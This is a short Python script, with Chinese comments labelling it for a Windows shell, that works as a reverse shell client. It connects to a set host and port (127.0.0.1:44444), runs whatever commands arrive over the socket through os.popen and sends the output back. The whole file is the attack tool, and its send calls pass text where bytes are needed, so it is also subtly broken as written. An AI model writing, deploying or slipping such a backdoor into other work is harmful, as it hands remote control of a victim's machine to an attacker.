#-*- coding: utf-8 -*-
"""
适用win_shell
"""

import os
from socket import *

HOST = '127.0.0.1'  #目标地址IP
PORT = 44444        #目标端口
BUFSIZ = 2048
ADDR=(HOST, PORT)
client = socket(AF_INET, SOCK_STREAM)
client.connect(ADDR)

while True:
    data = client.recv(BUFSIZ)
    if data: 
        PL = os.popen(data.decode('utf8'))
        os_result = PL.read()
        #print(os_result)
        if os_result == "":
            error = "shell error"
            client.sendall(error)
        else:   
            client.sendall(os_result)
